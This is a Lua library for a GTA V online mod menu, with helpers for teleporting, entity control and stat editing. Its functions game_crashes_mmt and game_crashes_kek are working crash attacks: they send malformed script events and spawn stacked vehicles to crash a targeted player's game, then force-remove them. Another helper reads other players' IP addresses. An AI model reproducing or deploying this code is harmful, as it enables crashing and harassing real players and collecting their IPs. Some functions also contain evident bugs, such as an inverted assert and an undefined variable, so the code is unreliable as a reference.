local _Module = {
    _VERSION = '0.1.0',
    _NAME = 'lib_utl'
}

local RB_G = require('libs.global')
local util_bas = require('utils.base')

function _Module.menu_binding(menus)
    for _, f_info in pairs(menus) do
        if #f_info == 5 then
            RB_G.menu[f_info[1]] = menu.add_feature(f_info[2], f_info[3], f_info[4], f_info[5])
        else
            RB_G.menu[f_info[1]] = menu.add_feature(f_info[2], f_info[3], f_info[4])
        end
    end
end

function _Module.notify(message, level, kwargs)
    kwargs = kwargs or {}
    kwargs.seconds = kwargs.seconds or 8
    level = level or RB_G.lvl.INF
    menu.notify(message, _Module.title_maker(kwargs), kwargs.seconds, RB_G.clr[level])
end

function _Module.title_maker(kwargs)
    kwargs = kwargs or {}
    kwargs.title = kwargs.title or '通知'
    kwargs.level = kwargs.level or RB_G.lvl.INF
    return 'RB_' .. kwargs.level .. '_' .. kwargs.title
end

function _Module.get_player_info_base(player_id)
    return {
        coords = player.get_player_coords(player_id),
        heading = player.get_player_heading(player_id),
        scid = player.get_player_scid(player_id),
        name = player.get_player_name(player_id),
        ped = player.get_player_ped(player_id),
        ip = util_bas.int2ip(player.get_player_ip(player_id))
    }
end

function _Module.get_player_info_status(player_id)
    local ply_ped = player.get_player_ped(player_id)
    return {
        god = player.is_player_god(player_id),
        dead = entity.is_entity_dead(ply_ped),
        visible = entity.is_entity_visible(ply_ped),
        scenario = ped.is_ped_using_any_scenario(ply_ped), -- 该项好像毫无作用
        interior_id = interior.get_interior_from_entity(ply_ped)
    }
end

function _Module.get_player_info_modder(player_id)
    local ret = {
        is_mod = false,
        flags = player.get_player_modder_flags(player_id),
        texts = {}
    }
    if ret.flags <= 0 then
        return ret
    end
    ret.is_mod = true
    for i = 1, #RB_G.mod_flg_i2v do
        if ret.flags & RB_G.mod_flg_i2v[i] ~= 0 then
            ret.texts[#ret.texts + 1] = player.get_modder_flag_text(RB_G.mod_flg_i2v[i])
        end
    end
    return ret
end

function _Module.dirs_auto_maker(dirspath)
    local dirsname = {}
    for dir_sub in string.gmatch(dirspath, '([^\\/]+)') do
        if dir_sub ~= nil then
            table.insert(dirsname, dir_sub)
        end
    end

    local temppath = ''
    for i, dir_sub in ipairs(dirsname) do
        if i == 1 then
            temppath = dir_sub
        else
            temppath = temppath .. '\\' .. dir_sub
        end
        if not utils.dir_exists(temppath) then
            utils.make_dir(temppath)
        end
    end
end

function _Module.gen_player_front_coords(player_id, kwargs)
    kwargs = kwargs or {}
    kwargs.distance = kwargs.distance or 3
    local coords = player.get_player_coords(player_id)
    local heading = player.get_player_heading(player_id)
    -- heading - 0 为正前方
    -- heading - 90 为正右方
    -- heading - 180 为正后方
    -- heading - 270 为正左方
    heading = math.rad((heading - 0) * -1)
    return v3(coords.x + math.sin(heading) * kwargs.distance, coords.y + math.cos(heading) * kwargs.distance, coords.z)
end

function _Module.teleport(entity_id, coords, kwargs)
    kwargs = kwargs or {}
    if kwargs.with_vehicle == nil then
        kwargs.with_vehicle = true
    end
    kwargs.delay = kwargs.delay or 500
    kwargs.before_teleport = kwargs.before_teleport or function()
    end
    kwargs.after_teleport = kwargs.after_teleport or function()
    end

    if ped.is_ped_in_any_vehicle(entity_id) and kwargs.with_vehicle then
        local vehicle_id = ped.get_vehicle_ped_is_using(entity_id)
        if vehicle_id > 0 then
            entity_id = vehicle_id
        else
            _Module.notify('无法找到 ' .. entity_id .. ' 乘坐的载具编号,请更换载具后再试',
                RB_G.lvl.ERR)
            return false
        end
    end
    if not coords.z then
        local ground_z = 0
        local suc = false
        for times = -1, 6 do
            for i = 850, -150, -50 do
                suc, ground_z = gameplay.get_ground_z(v3(coords.x, coords.y, i))
                if suc then
                    break
                end
            end
            if suc then
                break
            else
                entity.set_entity_coords_no_offset(entity_id, v3(coords.x, coords.y, times * 100))
                system.yield(250)
            end
        end
        if not suc then
            coords.x = coords.x + 50
            coords.y = coords.y + 50
            suc, ground_z = gameplay.get_ground_z(v3(coords.x, coords.y, 50))
        elseif ground_z < 0 then
            ground_z = 0
        end
        coords = v3(coords.x, coords.y, ground_z + 3)
        -- ground_z + 3 是为了防止玩家传送后下沉
        -- 频繁传送，会出现叠高高问题，但是不想改。有时候叠高高也蛮有意思
    end
    if kwargs.before_teleport(entity_id, coords, kwargs) == false then
        return false
    end
    entity.set_entity_coords_no_offset(entity_id, coords)
    if kwargs.after_teleport(entity_id, coords, kwargs) == false then
        return false
    end
    if kwargs.delay > 0 then
        system.yield(kwargs.delay)
    end
    return true
end

function _Module.request_control_of_entity(entity_id, kwargs)
    kwargs = kwargs or {}
    kwargs.timeout = kwargs.timeout or 3000
    if not entity.is_an_entity(entity_id) then
        return false
    end
    if network.has_control_of_entity(entity_id) then
        return true
    end
    local exit_time = os.clock() * 1000 + kwargs.timeout
    while exit_time > os.clock() * 1000 do
        if network.request_control_of_entity(entity_id) then
            return true
        end
        system.yield(1)
    end
    return network.has_control_of_entity(entity_id)
end

function _Module.control_npcs(control_func, kwargs)
    -- local results = {}
    kwargs = kwargs or {}
    kwargs.delay = kwargs.delay or 250
    kwargs.include_player = kwargs.include_player or false
    kwargs.include_dead = kwargs.include_dead or false
    kwargs.before_loop = kwargs.before_loop or function()
    end
    if kwargs.player then
        kwargs.player = {
            id = kwargs.player.id or player.player_id()
        }
    else
        kwargs.player = {
            id = player.player_id()
        }
    end
    local ply_coords = player.get_player_coords(kwargs.player.id)
    local ply_heading = player.get_player_heading(kwargs.player.id)
    kwargs.player.coords = ply_coords
    kwargs.player.heading = ply_heading

    kwargs.before_loop(kwargs)
    for _, ped_id in ipairs(ped.get_all_peds()) do
        local ped_coords = entity.get_entity_coords(ped_id)
        if util_bas.calc_distance(ply_coords, ped_coords) < RB_G.cfgs:get('WRLD', 'control_range') and
            (kwargs.include_player or not ped.is_ped_a_player(ped_id)) and
            (kwargs.include_dead or not entity.is_entity_dead(ped_id)) then
            kwargs.ped = {
                id = ped_id,
                coords = ped_coords
            }
            control_func(kwargs)
            -- if result ~= nil then results[#results + 1] = result end
        end
        ::continue::
    end
    if kwargs.delay > 0 then
        system.yield(kwargs.delay)
    end
    -- return results
end

-- function _Module.control_npcs(funcs, kwargs)
--     local results = {}
--     local ply_coords = player.get_player_coords(player.player_id())
--     if funcs.before_loop then funcs.before_loop(kwargs) end

--     for ped_idx, ped_id in ipairs(ped.get_all_peds()) do
--         local ped_coords = entity.get_entity_coords(ped_id)
--         if util_bas.calc_distance(ply_coords, ped_coords) <
--             RB_G.cfgs:get('WRLD', 'control_range') and
--             not ped.is_ped_a_player(ped_id) and
--             not entity.is_entity_dead(ped_id) then
--             local result = funcs.control(ped_idx, ped_id, kwargs)
--             if result ~= nil then results[#results + 1] = result end
--         end
--     end
--     system.yield(250)
--     return results
-- end

function _Module.control_objects(control_func, kwargs)
    -- local results = {}
    kwargs = kwargs or {}
    kwargs.delay = kwargs.delay or 250
    kwargs.before_loop = kwargs.before_loop or function()
    end
    if kwargs.player then
        kwargs.player = {
            id = kwargs.player.id or player.player_id()
        }
    else
        kwargs.player = {
            id = player.player_id()
        }
    end
    local ply_coords = player.get_player_coords(kwargs.player.id)
    local ply_heading = player.get_player_heading(kwargs.player.id)
    kwargs.player.coords = ply_coords
    kwargs.player.heading = ply_heading

    kwargs.before_loop(kwargs)

    for _, object_id in ipairs(object.get_all_pickups()) do
        local object_coords = entity.get_entity_coords(object_id)
        if util_bas.calc_distance(ply_coords, object_coords) < RB_G.cfgs:get('WRLD', 'control_range') then
            kwargs.object = {
                id = object_id,
                coords = object_coords
            }
            control_func(kwargs)
            -- if result ~= nil then results[#results + 1] = result end
        end
    end
    if kwargs.delay > 0 then
        system.yield(kwargs.delay)
    end
    -- return results
end

_Module.event_tracker = setmetatable({
    count = 0,
    id = 0
}, {
    __index = {},
    __newindex = function(Table, index, value)
        if value ~= nil then
            Table.count = Table.count + 1
            Table.id = Table.id + 1
            getmetatable(Table).__index[Table.id] = value
        else
            getmetatable(Table).__index[index] = nil
            Table.count = Table.count - 1
        end
    end,
    __pairs = function(Table)
        return next, getmetatable(Table).__index
    end
})

function _Module.send_script_event(hash, player_id, script_args, kwargs)
    -- 如果延迟太高，某些脚本事件（如 emp）将无法工作。1帧画面内事件计数危险阈值为20，超过这个值游戏可能崩溃。
    -- 如果1帧画面内事件计数低于 12，则可以发送。这个值大多数此类事件立即发送。
    kwargs = kwargs or {}
    kwargs.is_priority = kwargs.is_priority or false
    kwargs.can_yield = kwargs.can_yield or true
    kwargs.friend_skip = kwargs.friend_skip or true
    assert(type(hash) == "number" or type(player_id) == "number" or type(script_args) == "table", "type error")
    local is_err_typ = false
    for _, val in ipairs(script_args) do
        if type(val) ~= "number" then
            break
        end
    end
    if is_err_typ or not player.is_player_valid(player_id) or
        (kwargs.friend_skip and player.is_player_friend(player_id)) then
        return
    end
    repeat
        for i, time in pairs(_Module.event_tracker) do
            if time < utils.time_ms() then
                _Module.event_tracker[i] = nil
            end
        end
        if kwargs.can_yield and
            (_Module.event_tracker.count >= 10 and (not kwargs.is_priority or _Module.event_tracker.count < 12)) then
            system.yield(0)
        end
    until not kwargs.can_yield or
        (_Module.event_tracker.count < 10 or (kwargs.is_priority and _Module.event_tracker.count < 12))
    if _Module.event_tracker.count < 12 then
        _Module.event_tracker[true] = utils.time_ms() + math.ceil(2000 * gameplay.get_frame_time())
        script.trigger_script_event(hash, player_id, script_args)
        return true
    end
    return false
end

function _Module.send_script_event_by_name(name, player_id, script_args, kwargs)
    return _Module.send_script_event(RB_G.eve.n2h[name], player_id, script_args, kwargs)
end

function _Module.game_crashes_mmt(target_pid)
    _Module.notify('MMT型崩溃即将启动, 请远离目标对象500距离以上, 否则会被影响到', RB_G.lvl.INF)
    local self_player = {
        id = player.player_id()
    }
    self_player.ped = player.get_player_ped(self_player.id)
    self_player.coords = player.get_player_coords(self_player.id)
    local targ_player = {
        id = target_pid
    }
    targ_player.ped = player.get_player_ped(targ_player.id)
    targ_player.coords = player.get_player_coords(targ_player.id)

    local towtruck = _Module.gen_vehicle(-1323100960, targ_player.coords, 0)
    local tractor = _Module.gen_vehicle(-1323100960, targ_player.coords, 0)
    local cargobob = _Module.gen_vehicle(-50547061, targ_player.coords, 0)
    local skylift = _Module.gen_vehicle(1044954915, targ_player.coords, 0)
    local inv_obj = object.create_world_object(2155335200, targ_player.coords, true, false)
    local boat = _Module.gen_vehicle(276773164, targ_player.coords, 0)
    local saderly2 = _Module.gen_vehicle(734217681, targ_player.coords, 0)

    local n_v3 = v3(0, 0, 0)
    entity.attach_entity_to_entity(tractor, towtruck, 0, n_v3, n_v3, true, true, false, 0, true)
    entity.attach_entity_to_entity(cargobob, towtruck, 0, n_v3, n_v3, true, true, false, 0, true)
    entity.attach_entity_to_entity(inv_obj, towtruck, 0, n_v3, n_v3, true, true, false, 0, true)
    entity.attach_entity_to_entity(skylift, towtruck, 0, n_v3, n_v3, true, true, false, 0, true)
    entity.attach_entity_to_entity(boat, towtruck, 0, n_v3, n_v3, true, true, false, 0, true)
    entity.attach_entity_to_entity(saderly2, towtruck, 0, n_v3, n_v3, true, true, false, 0, true)
    local all_vehicle = vehicle.get_all_vehicles()
    for i = 1, #all_vehicle do
        entity.delete_entity(all_vehicle[i])
        system.wait(1)
    end
    local all_objects = object.get_all_objects()
    for i = 1, #all_objects do
        entity.delete_entity(all_objects[i])
    end
    -- system.wait(2000)
    -- entity.set_entity_coords_no_offset(self_player.ped, targ_player.coords)
    script.trigger_script_event(-2113023004, targ_player.id, {-1, -1, 0, 0, -20, 1000})
    script.trigger_script_event(-1056683619, targ_player.id, {-1, -1})
    script.trigger_script_event(1757755807, targ_player.id, {-1, -1})
    script.trigger_script_event(1258808115, targ_player.id, {-1, -1})
    script.trigger_script_event(-786546101, targ_player.id, {-1, -1})
    -- system.wait(3000)
    network.force_remove_player(targ_player.id)

    -- _Module.teleport(self_player.ped, self_player.coords)
end

function _Module.game_crashes_kek(target_pid)
    for i = 1, 19 do
        local parameters = {target_pid, -1774405356, math.random(0, 4), math.random(0, 1)}
        for i = 5, 13 do
            parameters[#parameters + 1] = math.random(-2147483647, 2147483647)
        end
        parameters[10] = target_pid
        _Module.send_script_event(RB_G.eve.crs.kek[#RB_G.eve.crs.kek], target_pid, parameters)
    end
    for _, script_hash in ipairs(RB_G.eve.crs.kek) do
        local parameters = {target_pid}
        for i = 2, 10 do
            parameters[#parameters + 1] = math.random(-2147483647, 2147483647)
        end
        _Module.send_script_event(script_hash, target_pid, parameters)
    end
end

function _Module.get_all_attached_entities(entity_id, entities)
    local entities = entities or {}
    for _, all_entities in pairs({vehicle.get_all_vehicles(), ped.get_all_peds(), object.get_all_objects()}) do
        for i = 1, #all_entities do
            if entity.get_entity_attached_to(all_entities[i]) == entity_id and
                not (entity.is_entity_a_ped(all_entities[i]) or ped.is_ped_a_player(all_entities[i])) then
                entities[#entities + 1] = all_entities[i]
                _Module.get_all_attached_entities(all_entities[i], entities)
            end
        end
    end
    return entities
end

function _Module.get_parent_attached(entity_id)
    if entity.is_entity_attached(entity_id) then
        return _Module.get_parent_attached(entity.get_entity_attached_to(entity_id))
    end
    return entity_id
end

function _Module.clear_entities_and_attached(entities_id)
    if type(entities_id) == "number" then
        entities_id = {entities_id}
    end
    for _, entity_id in ipairs(entities_id) do
        if not entity.is_an_entity(entity_id) then
            goto continue
        end
        entity_id = _Module.get_parent_attached(entity_id)
        if entity.is_entity_a_ped(entity_id) or ped.is_ped_a_player(entity_id) then
            goto continue
        end
        _Module.clear_entities(_Module.get_all_attached_entities(entity_id))
        ::continue::
    end
end

function _Module.clear_entities(entities_id)
    kwargs = kwargs or {}
    if type(entities_id) == "number" then
        entities_id = {entities_id}
    end

    for _, entity_id in ipairs(entities_id) do
        assert(entity.is_entity_a_ped(entity_id) or ped.is_ped_a_player(entity_id), 'tried to delete a player or ped.')
        _Module.request_control_of_entity(entity_id)
        if ui.get_blip_from_entity(entity_id) ~= 0 then
            ui.remove_blip(ui.get_blip_from_entity(entity_id))
        end
        if entity.is_entity_attached(entity_id) then
            entity.detach_entity(entity_id)
        end
        if not entity.is_entity_attached(entity_id) then
            if entity.is_entity_a_vehicle(entity_id) then
                entity.set_entity_as_mission_entity(entity_id, true, true)
            elseif entity.is_entity_an_object(entity_id) then
                entity.set_entity_as_mission_entity(entity_id, false, true)
            elseif entity.is_entity_a_ped(entity_id) then
                entity.set_entity_as_mission_entity(entity_id, false, false)
            end
            local hash = entity.get_entity_model_hash(entity_id)
            entity.delete_entity(entity_id)
            streaming.set_model_as_no_longer_needed(hash)
        end
    end
    -- return results
end

function _Module.gen_vehicle(hash, coords, heading, kwargs)
    kwargs = kwargs or {}
    if not hash then
        return
    end
    _Module.request_model(hash)
    local vehicle_id = vehicle.create_vehicle(hash, coords, heading, true, false)
    streaming.set_model_as_no_longer_needed(hash) -- 如果创建太多载具并且未设置为不再需要，游戏将崩溃
    return vehicle_id
end

_Module.text_layout = {
    size = 16,
    col_number = 10,
    hei_mul = 1
}
function _Module.text_layout:new(size, col_number, hei_mul, o)
    o = o or {}
    setmetatable(o, self)
    self.__index = self

    self.size = size or 16 -- 文本大小
    self.col_number = col_number or 10 -- 列的数量
    self.hei_mul = hei_mul or 1 -- 行高倍数
    return o
end
function _Module.text_layout:set(size, number, multiplier)
    self.size = size
    self.col_number = number
    self.hei_mul = multiplier
    -- ui.set_text_scale(self.size * 0.02)
end
function _Module.text_layout:set_size(size)
    self.size = size
    -- ui.set_text_scale(self.size * 0.02)
end
function _Module.text_layout:set_col_n(number)
    self.col_number = number
end
function _Module.text_layout:set_hei_h(multiplier)
    self.hei_mul = multiplier
end
function _Module.text_layout:gen_x(index)
    index = index or 0
    return 1 / self.col_number * index
end
function _Module.text_layout:gen_y(index)
    index = index or 0
    return self.size / 800 * self.hei_mul * index
end
function _Module.text_layout:draw(content, row_idx, col_idx)
    ui.set_text_scale(self.size * 0.02)
    ui.draw_text(content, v2(self:gen_x(row_idx), self:gen_y(col_idx)))
end

function _Module.is_online()
    return stats.stat_get_u64(gameplay.get_hash_key("MP_PLAYING_TIME")) ~= 0
end
function _Module.get_mp_index()
    return stats.stat_get_int(gameplay.get_hash_key("MPPLY_LAST_MP_CHAR"), 0)
end
function _Module.get_stat_hash(stat_name, kwargs)
    assert(stat_name ~= '', 'the value of "stat_name" is null.')
    kwargs = kwargs or {}
    if kwargs.is_mp == nil then
        kwargs.is_mp = true
    end
    if kwargs.is_mp then
        stat_name = string.format('MP%d_%s', _Module.get_mp_index(), stat_name)
    end
    local ret = gameplay.get_hash_key(stat_name)
    assert(hash ~= 0, string.format('The hash value of "%s" does not exist', kwargs.name))
    return ret
end
function _Module.control_stats(control_func, kwargs)
    kwargs = kwargs or {}
    kwargs.delay = kwargs.delay or 250
    if not _Module.is_online() then
        _Module.notify('请进入在线模式后再进行操作', RB_G.lvl.WRN)
        return
    end
    kwargs.hash = _Module.get_stat_hash
    kwargs.get_int = stats.stat_get_int
    kwargs.set_int = stats.stat_set_int
    kwargs.get_float = stats.stat_get_float
    kwargs.set_float = stats.stat_set_float
    kwargs.get_bool = stats.stat_get_bool
    kwargs.set_bool = stats.stat_set_bool
    kwargs.get_i64 = stats.stat_get_i64
    kwargs.set_i64 = stats.stat_set_i64
    kwargs.get_u64 = stats.stat_get_u64
    kwargs.set_u64 = stats.stat_set_u64
    kwargs.get_masked_int = stats.stat_get_masked_int
    kwargs.set_masked_int = stats.stat_set_masked_int
    kwargs.get_masked_bool = stats.stat_get_masked_bool
    kwargs.set_masked_bool = stats.stat_set_masked_bool
    kwargs.get_bool_hash_and_mask = stats.stat_get_bool_hash_and_mask
    kwargs.get_int_hash_and_mask = stats.stat_get_int_hash_and_mask
    local ret = control_func(kwargs)
    system.yield(kwargs.delay)
    return ret
end
function _Module.get_stat_by_name(type_val, name, kwargs)
    kwargs = kwargs or {}
    if type_val ~= RB_G.sta_typ.i64 and type_val ~= RB_G.sta_typ.u64 then
        kwargs.arg = 0
    end
    if not _Module.is_online() then
        _Module.notify('请进入在线模式后再进行操作', RB_G.lvl.WRN)
        return
    end
    local hash = _Module.get_stat_hash(name, kwargs)
    assert(hash ~= 0, string.format('The hash value of "%s" does not exist', name))
    local ret
    if kwargs.arg == 0 then
        ret = stats['stat_get_' .. type_val](hash, kwargs.arg)
    else
        ret = stats['stat_get_' .. type_val](hash)
    end
    return ret
end
function _Module.set_stat_by_name(type_val, name, value, kwargs)
    kwargs = kwargs or {}
    kwargs.delay = kwargs.delay or 250
    if type_val ~= RB_G.sta_typ.i64 and type_val ~= RB_G.sta_typ.u64 then
        kwargs.arg = kwargs.arg or true
    end
    if not _Module.is_online() then
        _Module.notify('请进入在线模式后再进行操作', RB_G.lvl.WRN)
        return
    end
    local hash = _Module.get_stat_hash(name, kwargs)
    assert(hash ~= 0, string.format('The hash value of "%s" does not exist', name))
    local ret = stats['stat_set_' .. type_val](hash, value, kwargs.arg)
    system.yield(kwargs.delay)
    return ret
end
function _Module.set_stats_by_name(stats_tbl, kwargs)
    local ret_data = {}
    for _, stat in ipairs(stats_tbl) do
        ret_data[#ret_data + 1] = _Module.set_stat_by_name(stats_tbl[1], stats_tbl[2], stats_tbl[3], kwargs)
    end
    return ret_data
end

function _Module.request_model(hash, kwargs)
    if not hash then
        return
    end
    kwargs = kwargs or {}
    kwargs.timeout = kwargs.timeout or 3000
    kwargs.timeout = kwargs.timeout / 1000

    if streaming.has_model_loaded(hash) then
        return true
    end
    streaming.request_model(hash)
    local exit_time = os.clock() + kwargs.timeout
    while exit_time > os.clock() do
        if streaming.has_model_loaded(hash) then
            return true
        end
        system.wait(200)
    end
    return streaming.has_model_loaded(hash)
end

return _Module